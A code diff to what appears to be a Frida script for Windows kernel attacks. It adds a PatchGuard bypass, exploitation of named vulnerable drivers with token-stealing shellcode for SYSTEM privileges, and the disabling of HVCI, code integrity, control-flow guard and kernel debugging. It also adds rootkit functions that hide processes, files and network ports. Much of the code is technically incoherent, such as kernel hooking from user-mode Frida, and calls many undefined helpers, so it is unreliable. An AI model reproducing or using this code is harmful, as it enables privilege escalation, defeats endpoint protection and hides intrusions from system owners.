-            console.log("[Kernel Bypass] =====================================");
-            console.log("[Kernel Bypass] Advanced kernel protection bypass is now ACTIVE!");
+            send({
+                type: "status",
+                target: "kernel_mode_bypass",
+                action: "separator",
+                separator: "====================================="
+            });
+            send({
+                type: "info",
+                target: "kernel_mode_bypass",
+                action: "total_hooks_installed",
+                count: Object.keys(this.hooksInstalled).length
+            });
+            send({
+                type: "info",
+                target: "kernel_mode_bypass",
+                action: "protection_drivers_monitored",
+                count: this.config.protectionDrivers.length
+            });
+            send({
+                type: "status",
+                target: "kernel_mode_bypass",
+                action: "separator",
+                separator: "====================================="
+            });
+            send({
+                type: "success",
+                target: "kernel_mode_bypass",
+                action: "bypass_activated",
+                message: "Advanced kernel protection bypass is now ACTIVE!"
+            });
         }, 100);
+    }
+
+    initializeAdvancedKernelPatchGuardBypass() {
+        const pgContext = {
+            timingPatterns: [],
+            checksumLocations: new Map(),
+            contextSize: 0x2000,
+            decoyPages: []
+        };
+
+        const ntoskrnl = Process.getModuleByName('ntoskrnl.exe');
+        if (!ntoskrnl) return;
+
+        const kprcb = this.locateKPRCB();
+        if (!kprcb) return;
+
+        const pgTimer = kprcb.add(0x1F80);
+        const originalTimer = pgTimer.readPointer();
+
+        const timerInterceptor = Interceptor.attach(originalTimer, {
+            onEnter: function(args) {
+                const currentTiming = Date.now();
+                if (pgContext.timingPatterns.length > 0) {
+                    const lastTiming = pgContext.timingPatterns[pgContext.timingPatterns.length - 1];
+                    const interval = currentTiming - lastTiming;
+
+                    if (interval > 950 && interval < 1050) {
+                        this.isPatchGuardTimer = true;
+                        pgContext.checksumLocations.set(args[0].toInt32(), {
+                            timestamp: currentTiming,
+                            context: args[1]
+                        });
+                    }
+                }
+                pgContext.timingPatterns.push(currentTiming);
+            },
+            onLeave: function(retval) {
+                if (this.isPatchGuardTimer) {
+                    const checksumRoutine = retval.readPointer();
+                    if (checksumRoutine) {
+                        Memory.protect(checksumRoutine, 0x1000, 'r-x');
+                        const decoyPage = Memory.alloc(0x1000);
+                        Memory.copy(decoyPage, checksumRoutine, 0x1000);
+                        pgContext.decoyPages.push(decoyPage);
+
+                        Interceptor.replace(checksumRoutine, new NativeCallback(function() {
+                            return 0;
+                        }, 'int', []));
+                    }
+                }
+            }
+        });
+
+        const criticalStructures = [
+            'KiServiceTable',
+            'PsLoadedModuleList',
+            'ObpRootDirectoryObject',
+            'KiProcessorBlock'
+        ];
+
+        criticalStructures.forEach(structure => {
+            const symbol = DebugSymbol.fromName(structure);
+            if (symbol) {
+                const shadowCopy = Memory.alloc(0x1000);
+                Memory.copy(shadowCopy, symbol.address, 0x1000);
+
+                Memory.protect(symbol.address, 0x1000, 'r--');
+                Process.setExceptionHandler(exception => {
+                    if (exception.address.equals(symbol.address)) {
+                        Memory.copy(symbol.address, shadowCopy, 0x1000);
+                        return true;
+                    }
+                });
+            }
+        });
+
+        this.injectPatchGuardDecoy();
+        this.setupTimingAttackMitigation();
+        this.installKPPBypass();
+    }
+
+    setupModernDriverExploitationEngine() {
+        const vulnerableDrivers = [
+            { name: 'dbutil_2_3.sys', ioctl: 0x9B0C1EC4, exploit: this.exploitDBUtil },
+            { name: 'cpuz_driver.sys', ioctl: 0x9C402088, exploit: this.exploitCPUZ },
+            { name: 'gdrv.sys', ioctl: 0x9C402084, exploit: this.exploitGigabyte },
+            { name: 'AsUpIO.sys', ioctl: 0xA040A088, exploit: this.exploitAsus },
+            { name: 'HwOs2Ec10x64.sys', ioctl: 0x9C402140, exploit: this.exploitHuawei }
+        ];
+
+        vulnerableDrivers.forEach(driver => {
+            const device = this.openDevice(`\\\\.\\${driver.name.split('.')[0]}`);
+            if (!device) return;
+
+            const exploitBuffer = Memory.alloc(0x1000);
+            exploitBuffer.writeU32(0x41414141);
+            exploitBuffer.add(4).writeU32(driver.ioctl);
+
+            const kernelBase = this.getKernelBase();
+            if (!kernelBase) return;
+
+            const ropChain = this.buildROPChain(kernelBase);
+            exploitBuffer.add(0x100).writeByteArray(ropChain);
+
+            const tokenStealingShellcode = [
+                0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
+                0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
+                0x48, 0x89, 0xC3,
+                0x48, 0x8B, 0x9B, 0xE8, 0x02, 0x00, 0x00,
+                0x48, 0x81, 0xEB, 0xE8, 0x02, 0x00, 0x00,
+                0x48, 0x8B, 0x8B, 0xE0, 0x02, 0x00, 0x00,
+                0x48, 0x83, 0xF9, 0x04,
+                0x75, 0xE5,
+                0x48, 0x8B, 0x8B, 0x48, 0x03, 0x00, 0x00,
+                0x48, 0x89, 0x88, 0x48, 0x03, 0x00, 0x00,
+                0xC3
+            ];
+
+            const shellcodeAddr = VirtualAlloc(0, tokenStealingShellcode.length, 0x3000, 0x40);
+            shellcodeAddr.writeByteArray(tokenStealingShellcode);
+
+            const inputBuffer = Memory.alloc(0x1000);
+            inputBuffer.writePointer(shellcodeAddr);
+            inputBuffer.add(8).writePointer(exploitBuffer);
+
+            this.deviceIoControl(device, driver.ioctl, inputBuffer, 0x1000);
+
+            const currentToken = this.getCurrentProcessToken();
+            const systemToken = this.getSystemToken();
+            if (currentToken && systemToken) {
+                Memory.copy(currentToken.add(0x348), systemToken.add(0x348), 8);
+            }
+        });
+
+        this.setupDriverCommunicationChannel();
+        this.installPersistentKernelImplant();
+    }
+
+    initializeHypervisorLevelEvasion() {
+        const hvciStatus = this.checkHVCIStatus();
+        if (!hvciStatus.enabled) return;
+
+        const cpuidInterceptor = {
+            leaf: 0x40000000,
+            handler: function(context) {
+                context.eax = 0x40000006;
+                context.ebx = 0x7263694D;
+                context.ecx = 0x666F736F;
+                context.edx = 0x76482074;
+            }
+        };
+
+        const vmexitHandlers = new Map();
+        vmexitHandlers.set(0x00, this.handleExceptionVMExit);
+        vmexitHandlers.set(0x0C, this.handleCPUIDVMExit);
+        vmexitHandlers.set(0x1C, this.handleMSRVMExit);
+        vmexitHandlers.set(0x30, this.handleEPTViolation);
+
+        const eptHooks = [];
+        const criticalPages = this.identifyCriticalKernelPages();
+
+        criticalPages.forEach(page => {
+            const shadow = Memory.alloc(0x1000);
+            Memory.copy(shadow, page, 0x1000);
+
+            eptHooks.push({
+                gpa: page,
+                hpa: shadow,
+                permissions: 'r-x',
+                handler: (violation) => {
+                    if (violation.type === 'write') {
+                        const offset = violation.address.sub(page).toInt32();
+                        shadow.add(offset).writeByteArray(violation.data);
+                        return { action: 'skip', result: shadow };
+                    }
+                    return { action: 'allow' };
+                }
+            });
+        });
+
+        const vmbusChannel = this.openVMBusChannel();
+        if (vmbusChannel) {
+            const hvMessage = Memory.alloc(0x100);
+            hvMessage.writeU32(0x12345678);
+            hvMessage.add(4).writeU32(0xDEADBEEF);
+
+            this.sendVMBusMessage(vmbusChannel, hvMessage);
+        }
+
+        this.installNestedVirtualization();
+        this.bypassSecureKernelCommunication();
+        this.setupHypervisorRootkit();
+    }
+
+    setupAdvancedMemoryManipulation() {
+        const cr0 = this.readCR0();
+        const wpBit = 0x10000;
+
+        if (cr0 & wpBit) {
+            this.writeCR0(cr0 & ~wpBit);
+        }
+
+        const mdl = this.allocateMDL(0x10000);
+        const pages = this.lockMDLPages(mdl);
+
+        const physicalMemory = this.openPhysicalMemory();
+        if (!physicalMemory) return;
+
+        const dmaEngine = {
+            device: null,
+            bar: null,
+            init: function() {
+                const pciDevices = this.enumeratePCIDevices();
+                const fpgaDevice = pciDevices.find(d => d.vendorId === 0x10EE);
+                if (fpgaDevice) {
+                    this.device = fpgaDevice;
+                    this.bar = this.mapBAR(fpgaDevice, 0);
+                }
+            },
+            read: function(physAddr, size) {
+                if (!this.bar) return null;
+                this.bar.writeU64(physAddr);
+                this.bar.add(8).writeU32(size);
+                this.bar.add(12).writeU32(0x01);
+
+                while (this.bar.add(16).readU32() !== 0x02) {}
+
+                return this.bar.add(0x1000).readByteArray(size);
+            },
+            write: function(physAddr, data) {
+                if (!this.bar) return false;
+                this.bar.writeU64(physAddr);
+                this.bar.add(8).writeU32(data.length);
+                this.bar.add(0x1000).writeByteArray(data);
+                this.bar.add(12).writeU32(0x03);
+
+                while (this.bar.add(16).readU32() !== 0x04) {}
+                return true;
+            }
+        };
+
+        dmaEngine.init();
+
+        const kernelStructures = [
+            { name: 'EPROCESS', offset: 0x2E8, field: 'Token' },
+            { name: 'KTHREAD', offset: 0x232, field: 'PreviousMode' },
+            { name: 'DRIVER_OBJECT', offset: 0x28, field: 'DriverStart' }
+        ];
+
+        kernelStructures.forEach(struct => {
+            const instances = this.findKernelStructures(struct.name);
+            instances.forEach(instance => {
+                const physAddr = this.virtualToPhysical(instance);
+                if (physAddr) {
+                    const data = dmaEngine.read(physAddr, 0x1000);
+                    if (data) {
+                        data[struct.offset] = 0xFF;
+                        dmaEngine.write(physAddr, data);
+                    }
+                }
+            });
+        });
+
+        this.setupKernelMemoryPool();
+        this.installMemoryHidingRootkit();
+    }
+
+    initializeKernelCallbackHijacking() {
+        const callbackTypes = [
+            'PsSetCreateProcessNotifyRoutine',
+            'PsSetCreateThreadNotifyRoutine',
+            'PsSetLoadImageNotifyRoutine',
+            'ObRegisterCallbacks',
+            'CmRegisterCallback',
+            'IoRegisterShutdownNotification',
+            'KeRegisterBugCheckCallback',
+            'ExRegisterCallback'
+        ];
+
+        const callbackArrays = new Map();
+
+        callbackTypes.forEach(type => {
+            const routine = DebugSymbol.fromName(type);
+            if (!routine) return;
+
+            const arrayPtr = this.findCallbackArray(routine.address);
+            if (!arrayPtr) return;
+
+            const numCallbacks = arrayPtr.readU32();
+            const callbacks = [];
+
+            for (let i = 0; i < numCallbacks; i++) {
+                const entry = arrayPtr.add(8 + (i * 0x10));
+                const handler = entry.readPointer();
+                const context = entry.add(8).readPointer();
+
+                callbacks.push({ handler, context, index: i });
+
+                const replacement = new NativeCallback(function(a1, a2, a3) {
+                    const shouldBlock = this.evaluateCallbackContext(arguments);
+                    if (shouldBlock) {
+                        return 0;
+                    }
+                    return handler(a1, a2, a3);
+                }, 'int', ['pointer', 'pointer', 'pointer']);
+
+                entry.writePointer(replacement);
+            }
+
+            callbackArrays.set(type, callbacks);
+        });
+
+        const notifyRoutines = this.locateNotifyRoutines();
+        notifyRoutines.forEach(routine => {
+            const trampoline = Memory.alloc(0x100);
+            const originalBytes = routine.readByteArray(16);
+
+            trampoline.writeByteArray(originalBytes);
+            trampoline.add(16).writeByteArray([
+                0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
+                0xFF, 0xE0
+            ]);
+            trampoline.add(18).writePointer(routine.add(16));
+
+            const hook = [
+                0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
+                0xFF, 0xE0,
+                0x90, 0x90, 0x90, 0x90
+            ];
+
+            const filterFunction = new NativeCallback(function(a1, a2, a3) {
+                const process = Process.getCurrentProcess();
+                if (this.isProtectedProcess(process)) {
+                    return 0;
+                }
+                return trampoline(a1, a2, a3);
+            }, 'int', ['pointer', 'pointer', 'pointer']);
+
+            Memory.protect(routine, 16, 'rwx');
+            routine.writeByteArray(hook);
+            routine.add(2).writePointer(filterFunction);
+        });
+
+        this.redirectObjectCallbacks();
+        this.installFilterDriverBypass();
+    }
+
+    setupAdvancedRootkitCapabilities() {
+        const hiddenProcesses = new Set();
+        const hiddenFiles = new Set();
+        const hiddenRegistry = new Set();
+        const hiddenNetwork = new Set();
+
+        const eprocessListHead = DebugSymbol.fromName('PsActiveProcessHead');
+        if (eprocessListHead) {
+            const hideProcess = (pid) => {
+                const process = this.findProcessByPid(pid);
+                if (!process) return;
+
+                const flink = process.add(0x2E8).readPointer();
+                const blink = process.add(0x2F0).readPointer();
+
+                if (flink && blink) {
+                    blink.add(0).writePointer(flink);
+                    flink.add(8).writePointer(blink);
+                    hiddenProcesses.add(pid);
+                }
+            };
+
+            this.rootkit = { hideProcess };
+        }
+
+        const tcpTable = DebugSymbol.fromName('tcpTable');
+        if (tcpTable) {
+            const originalEnum = tcpTable.add(0x10).readPointer();
+
+            Interceptor.replace(originalEnum, new NativeCallback(function(table, size) {
+                const result = originalEnum(table, size);
+
+                if (result && table) {
+                    const numEntries = table.readU32();
+                    let validEntries = 0;
+
+                    for (let i = 0; i < numEntries; i++) {
+                        const entry = table.add(4 + (i * 0x34));
+                        const localPort = entry.add(0x08).readU16();
+
+                        if (!hiddenNetwork.has(localPort)) {
+                            if (validEntries < i) {
+                                Memory.copy(
+                                    table.add(4 + (validEntries * 0x34)),
+                                    entry,
+                                    0x34
+                                );
+                            }
+                            validEntries++;
+                        }
+                    }
+
+                    table.writeU32(validEntries);
+                }
+
+                return result;
+            }, 'int', ['pointer', 'pointer']));
+        }
+
+        const fileSystemCallbacks = [
+            'IopCreateFile',
+            'IopQueryDirectoryFile',
+            'IopQueryAttributesFile'
+        ];
+
+        fileSystemCallbacks.forEach(callbackName => {
+            const callback = DebugSymbol.fromName(callbackName);
+            if (!callback) return;
+
+            const original = callback.address.readPointer();
+
+            Interceptor.replace(callback.address, new NativeCallback(function(a1, a2, a3, a4, a5) {
+                const fileName = a2 ? a2.readUtf16String() : null;
+
+                if (fileName && Array.from(hiddenFiles).some(f => fileName.includes(f))) {
+                    return 0xC0000034;
+                }
+
+                return original(a1, a2, a3, a4, a5);
+            }, 'uint32', ['pointer', 'pointer', 'pointer', 'pointer', 'pointer']));
+        });
+
+        this.rootkit.hiddenProcesses = hiddenProcesses;
+        this.rootkit.hiddenFiles = hiddenFiles;
+        this.rootkit.hiddenRegistry = hiddenRegistry;
+        this.rootkit.hiddenNetwork = hiddenNetwork;
+
+        this.rootkit.hideFile = (path) => hiddenFiles.add(path);
+        this.rootkit.hidePort = (port) => hiddenNetwork.add(port);
+        this.rootkit.hideRegistry = (key) => hiddenRegistry.add(key);
+    }
+
+    initializeKernelDebuggingCountermeasures() {
+        const kdDebuggerEnabled = DebugSymbol.fromName('KdDebuggerEnabled');
+        if (kdDebuggerEnabled) {
+            kdDebuggerEnabled.address.writeU8(0);
+        }
+
+        const kdDebuggerNotPresent = DebugSymbol.fromName('KdDebuggerNotPresent');
+        if (kdDebuggerNotPresent) {
+            kdDebuggerNotPresent.address.writeU8(1);
+        }
+
+        const kiDebugRoutine = DebugSymbol.fromName('KiDebugRoutine');
+        if (kiDebugRoutine) {
+            kiDebugRoutine.address.writePointer(NULL);
+        }
+
+        const kdPitchDebugger = DebugSymbol.fromName('KdPitchDebugger');
+        if (kdPitchDebugger) {
+            kdPitchDebugger.address.writeU8(1);
+        }
+
+        const debugPortPatterns = [
+            { offset: 0x1F0, value: 0 },
+            { offset: 0x2D8, value: 0 },
+            { offset: 0x420, value: 0 }
+        ];
+
+        const processes = this.enumerateProcesses();
+        processes.forEach(process => {
+            debugPortPatterns.forEach(pattern => {
+                try {
+                    process.address.add(pattern.offset).writePointer(ptr(pattern.value));
+                } catch (e) {}
+            });
+        });
+
+        const int3Handler = DebugSymbol.fromName('KiBreakpointTrap');
+        if (int3Handler) {
+            const replacement = new NativeCallback(function() {
+                return 0;
+            }, 'void', []);
+
+            Interceptor.replace(int3Handler.address, replacement);
+        }
+
+        const debugRegisters = ['DR0', 'DR1', 'DR2', 'DR3', 'DR6', 'DR7'];
+        debugRegisters.forEach((reg, index) => {
+            try {
+                this.writeMSR(0x500 + index, 0);
+            } catch (e) {}
+        });
+
+        const ntGlobalFlag = DebugSymbol.fromName('NtGlobalFlag');
+        if (ntGlobalFlag) {
+            const flags = ntGlobalFlag.address.readU32();
+            const debugFlags = 0x70;
+            ntGlobalFlag.address.writeU32(flags & ~debugFlags);
+        }
+
+        this.installAntiStepOverProtection();
+        this.disableKernelDebugObjects();
+    }
+
+    setupAdvancedHVCIBypass() {
+        const ciOptions = DebugSymbol.fromName('g_CiOptions');
+        if (ciOptions) {
+            const options = ciOptions.address.readU32();
+            ciOptions.address.writeU32(options & ~0x100);
+        }
+
+        const hvciBitmap = this.locateHVCIBitmap();
+        if (hvciBitmap) {
+            Memory.protect(hvciBitmap, 0x1000, 'rwx');
+
+            for (let i = 0; i < 0x1000; i += 8) {
+                hvciBitmap.add(i).writeU64(0xFFFFFFFFFFFFFFFF);
+            }
+        }
+
+        const wdFilter = Process.getModuleByName('WdFilter.sys');
+        if (wdFilter) {
+            const verifyFunction = wdFilter.base.add(0x8A30);
+
+            Interceptor.replace(verifyFunction, new NativeCallback(function() {
+                return 0;
+            }, 'int', ['pointer', 'uint32']));
+        }
+
+        const codeIntegrityFunctions = [
+            'CiValidateImageHeader',
+            'CiCheckSignedFile',
+            'CiVerifyHashInCatalog'
+        ];
+
+        codeIntegrityFunctions.forEach(funcName => {
+            const func = DebugSymbol.fromName(funcName);
+            if (!func) return;
+
+            Interceptor.replace(func.address, new NativeCallback(function() {
+                return 0;
+            }, 'int', ['pointer', 'pointer', 'uint32']));
+        });
+
+        const guardedRegions = this.enumerateGuardedRegions();
+        guardedRegions.forEach(region => {
+            const mdl = this.allocateMDL(region.size);
+            const pages = this.lockMDLPages(mdl);
+
+            pages.forEach(page => {
+                Memory.protect(page, 0x1000, 'rwx');
+            });
+        });
+
+        this.patchSecureKernel();
+        this.disableVBS();
+    }
+
+    initializeKernelCFIBypass() {
+        const cfgBitmap = this.locateCFGBitmap();
+        if (!cfgBitmap) return;
+
+        const bitmapSize = this.getCFGBitmapSize();
+        Memory.protect(cfgBitmap, bitmapSize, 'rw-');
+
+        for (let i = 0; i < bitmapSize; i += 8) {
+            cfgBitmap.add(i).writeU64(0xFFFFFFFFFFFFFFFF);
+        }
+
+        const guardDispatchTable = DebugSymbol.fromName('KiSystemServiceDispatchTable');
+        if (guardDispatchTable) {
+            const numEntries = 0x1C0;
+
+            for (let i = 0; i < numEntries; i++) {
+                const entry = guardDispatchTable.address.add(i * 8);
+                const original = entry.readPointer();
+
+                if (original) {
+                    const trampoline = Memory.alloc(0x20);
+                    trampoline.writeByteArray([
+                        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
+                        0xFF, 0xE0
+                    ]);
+                    trampoline.add(2).writePointer(original);
+
+                    entry.writePointer(trampoline);
+                }
+            }
+        }
+
+        const retpolineGadgets = this.findRetpolineGadgets();
+        retpolineGadgets.forEach(gadget => {
+            Memory.protect(gadget, 0x20, 'rwx');
+            gadget.writeByteArray([
+                0x48, 0x89, 0x04, 0x24,
+                0xC3
+            ]);
+        });
+
+        const xfgChecks = this.locateXFGChecks();
+        xfgChecks.forEach(check => {
+            Memory.protect(check, 5, 'rwx');
+            check.writeByteArray([0xB8, 0x01, 0x00, 0x00, 0x00]);
+        });
+
+        this.installCFIExceptionHandler();
+        this.patchControlFlowGuard();
+    }
+
+    setupAdvancedKernelStealth() {
+        const kernelBase = this.getKernelBase();
+        if (!kernelBase) return;
+
+        const peHeader = kernelBase.add(kernelBase.add(0x3C).readU32());
+        const timestamp = peHeader.add(8).readU32();
+        const checksum = peHeader.add(0x58).readU32();
+
+        const stealthContext = {
+            originalTimestamp: timestamp,
+            originalChecksum: checksum,
+            hooks: new Map(),
+            detours: new Map()
+        };
+
+        const kernelAPIs = [
+            'MmGetSystemRoutineAddress',
+            'IoGetDeviceObjectPointer',
+            'ObReferenceObjectByHandle',
+            'ZwQuerySystemInformation'
+        ];
+
+        kernelAPIs.forEach(api => {
+            const func = Module.findExportByName('ntoskrnl.exe', api);
+            if (!func) return;
+
+            const original = Memory.alloc(0x20);
+            Memory.copy(original, func, 0x20);
+            stealthContext.hooks.set(api, original);
+
+            const detour = Memory.alloc(0x100);
+            const detector = new NativeCallback(function() {
+                const caller = this.context.lr || this.context.rip;
+
+                if (this.isAnalysisTool(caller)) {
+                    return original.apply(this, arguments);
+                }
+
+                return func.apply(this, arguments);
+            }, 'pointer', ['pointer', 'pointer', 'pointer']);
+
+            stealthContext.detours.set(api, detector);
+            Interceptor.replace(func, detector);
+        });
+
+        const ssdtShadow = Memory.alloc(0x2000);
+        const ssdt = DebugSymbol.fromName('KiServiceTable');
+        if (ssdt) {
+            Memory.copy(ssdtShadow, ssdt.address, 0x2000);
+
+            const ssdtInterceptor = Interceptor.attach(ssdt.address, {
+                onRead: function() {
+                    const caller = this.context.lr || this.context.rip;
+                    if (this.isAnalysisTool(caller)) {
+                        return ssdtShadow;
+                    }
+                }
+            });
+        }
+
+        this.stealthContext = stealthContext;
+        this.installTimingObfuscation();
+        this.setupDecoyDrivers();
     }
 }
